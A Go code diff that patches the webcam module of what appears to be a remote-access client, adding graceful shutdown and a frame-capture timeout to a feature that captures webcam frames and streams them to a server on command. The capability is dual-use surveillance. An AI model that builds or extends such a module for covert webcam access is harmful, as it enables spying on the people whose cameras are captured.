@@ -102,6 +102,7 @@ type WebcamSession struct {
 	stop       chan struct{}
 	senderStop chan struct{}
 	mu         sync.Mutex
+	wg         sync.WaitGroup // FIXED: WaitGroup for graceful shutdown (Issue #12)
 	running    bool
 	width      int
 	height     int
@@ -244,7 +245,8 @@ func HandleSelect(pack modules.Packet) error {
 	frameInterval := 1000 / webcamSession.fps
 	procSendMessageW.Call(hwnd, WM_CAP_SET_PREVIEWRATE, uintptr(frameInterval), 0)
 
-	// Start capture goroutine
+	// FIXED: Start capture goroutine with WaitGroup (Issue #12)
+	webcamSession.wg.Add(2) // capture + sender
 	go captureLoop(webcamSession)
 
 	// Start packet sender
@@ -258,6 +260,7 @@ func HandleSelect(pack modules.Packet) error {
 
 // captureLoop continuously captures frames from webcam
 func captureLoop(session *WebcamSession) {
+	defer session.wg.Done() // FIXED: Signal completion (Issue #12)
 	defer func() {
 		fmt.Printf("[INFO] Webcam capture loop stopped\n")
 	}()
@@ -266,21 +269,48 @@ func captureLoop(session *WebcamSession) {
 	ticker := time.NewTicker(frameDuration)
 	defer ticker.Stop()
 
+	// FIXED: Add frame capture timeout to prevent blocking (Issue #6)
+	const grabTimeout = 100 * time.Millisecond
+	frameChan := make(chan []byte, 1)
+	errChan := make(chan error, 1)
+
+	fmt.Printf("[INFO] Webcam capture loop started with ticker: %v\n", frameDuration)
+
 	for {
 		select {
 		case <-session.stop:
 			return
 		case <-ticker.C:
-			frame, err := grabFrame(session)
-			if err != nil {
-				atomic.AddUint64(&session.errors, 1)
-				continue
-			}
+			// FIXED: Capture frame with timeout to avoid blocking ticker
+			go func() {
+				frame, err := grabFrame(session)
+				if err != nil {
+					errChan <- err
+					return
+				}
+				select {
+				case frameChan <- frame:
+				default:
+					// Can't send, frame will be dropped
+				}
+			}()
 
+			// Wait for frame or timeout
 			select {
-			case session.frameData <- frame:
-			default:
-				// Channel full, drop frame
+			case frame := <-frameChan:
+				// Successfully captured frame
+				select {
+				case session.frameData <- frame:
+				default:
+					// Channel full, drop frame
+					atomic.AddUint64(&session.errors, 1)
+				}
+			case <-errChan:
+				// Error during capture
+				atomic.AddUint64(&session.errors, 1)
+			case <-time.After(grabTimeout):
+				// Timeout - grabFrame is taking too long, skip this frame
+				atomic.AddUint64(&session.errors, 1)
 			}
 		}
 	}
@@ -398,6 +428,7 @@ func grabFrame(session *WebcamSession) ([]byte, error) {
 
 // webcamPacketSender reads encoded frames from channel and sends packets to server
 func webcamPacketSender(session *WebcamSession) {
+	defer session.wg.Done() // FIXED: Signal completion (Issue #12)
 	defer fmt.Printf("[INFO] Webcam packet sender stopped\n")
 
 	for {
@@ -468,7 +499,10 @@ func KillWebcam(pack modules.Packet) {
 	webcamSession.mu.Unlock()
 
 	if wasRunning {
-		time.Sleep(100 * time.Millisecond)
+		// FIXED: Wait for goroutines to finish properly (Issue #12)
+		fmt.Printf("[INFO] Waiting for webcam goroutines to finish...\n")
+		webcamSession.wg.Wait()
+		fmt.Printf("[INFO] All webcam goroutines stopped\n")
 	}
 
 	// Print statistics
